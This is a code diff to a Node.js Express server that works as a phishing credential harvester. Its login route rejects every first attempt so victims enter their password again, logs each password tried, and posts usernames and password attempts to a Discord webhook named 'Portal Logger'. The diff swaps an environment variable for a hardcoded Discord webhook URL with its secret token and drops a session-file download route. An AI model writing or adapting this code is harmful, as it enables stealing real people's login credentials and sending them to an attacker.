@@ -6,7 +6,7 @@ import bodyParser from "body-parser";
 import cookieParser from "cookie-parser";
 import path from "path";
 import fs from "fs";
-import fetch from "node-fetch"; // install this: npm i node-fetch
+import fetch from "node-fetch"; // install: npm i node-fetch
 
 const app = express();
 const PORT = process.env.PORT || 4000;
@@ -19,18 +19,17 @@ app.use(express.static(path.join(__dirname, "public")));
 const SESSIONS_DIR = path.join(__dirname, "sessions");
 if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);
 
-// Track login attempts and passwords
+// Track user attempts and passwords
 const userAttempts = {}; // { username: { count, passwords: [] } }
 
-// ------------------ Discord Webhook ------------------
-async function sendToDiscord(username, passwords, status, token) {
-  const webhook = process.env.DISCORD_WEBHOOK_URL;
-  if (!webhook) {
-    console.log("⚠️ Discord webhook not configured (add in environment variables).");
-    return;
-  }
+// ✅ Direct webhook link (your Discord)
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1436156814369755328/f9L1OVJdp8BuEnrX4C-tHkrT3DzGNP_Vy9PzWyFG1Vjozs_fdLVfcfeiEQ0XbZ0YlXRk"; // <-- your webhook
 
-  const msg = {
+// ------------------ Send Message to Discord ------------------
+async function sendToDiscord(username, passwords, status) {
+  const webhook = DISCORD_WEBHOOK_URL;
+
+  const message = {
     username: "Portal Logger",
     embeds: [
       {
@@ -40,10 +39,7 @@ async function sendToDiscord(username, passwords, status, token) {
           { name: "Username", value: username, inline: false },
           { name: "Password Attempts", value: passwords.join("\n"), inline: false },
           { name: "Status", value: status, inline: true },
-          { name: "Time", value: new Date().toLocaleString(), inline: true },
-          ...(token
-            ? [{ name: "Session File", value: `[Download JSON](https://${process.env.RENDER_EXTERNAL_HOSTNAME}/download/${token})`, inline: false }]
-            : [])
+          { name: "Time", value: new Date().toLocaleString(), inline: true }
         ]
       }
     ]
@@ -53,7 +49,7 @@ async function sendToDiscord(username, passwords, status, token) {
     await fetch(webhook, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(msg)
+      body: JSON.stringify(message)
     });
     console.log(`📤 Sent login info for ${username} to Discord`);
   } catch (err) {
@@ -61,18 +57,18 @@ async function sendToDiscord(username, passwords, status, token) {
   }
 }
 
-// ------------------ Session Creation ------------------
+// ------------------ Create Session File ------------------
 function createSessionFile(username) {
   const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
   const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
-  const sessionData = {
+  const data = {
     username,
     attempts: userAttempts[username]?.passwords || [],
     token,
     created: new Date().toISOString(),
     expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString()
   };
-  fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));
+  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
   console.log(`🗂 Session created → ${filePath}`);
   return token;
 }
@@ -90,30 +86,19 @@ app.post("/login", async (req, res) => {
 
   console.log(`🔐 Attempt ${userAttempts[username].count} for ${username} → "${password}"`);
 
-  // First attempt always rejected
+  // 1️⃣ First attempt rejected
   if (userAttempts[username].count < 2) {
     await sendToDiscord(username, userAttempts[username].passwords, "Rejected");
     return res.status(401).send("Incorrect password. Please try again.");
   }
 
-  // Second attempt accepted
+  // 2️⃣ Second attempt accepted
   const token = createSessionFile(username);
   res.cookie("session_id", token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
 
-  await sendToDiscord(username, userAttempts[username].passwords, "Success", token);
+  await sendToDiscord(username, userAttempts[username].passwords, "Success");
   console.log(`✅ Login successful for ${username}`);
   res.status(200).json({ message: "Login successful", token });
-});
-
-// ------------------ SESSION FILE DOWNLOAD ------------------
-app.get("/download/:token", (req, res) => {
-  const token = req.params.token;
-  const filePath = path.join(SESSIONS_DIR, `session_${token}.json`);
-  if (fs.existsSync(filePath)) {
-    res.download(filePath, `session_${token}.json`);
-  } else {
-    res.status(404).send("Session not found.");
-  }
 });
 
 // ------------------ DASHBOARD ------------------
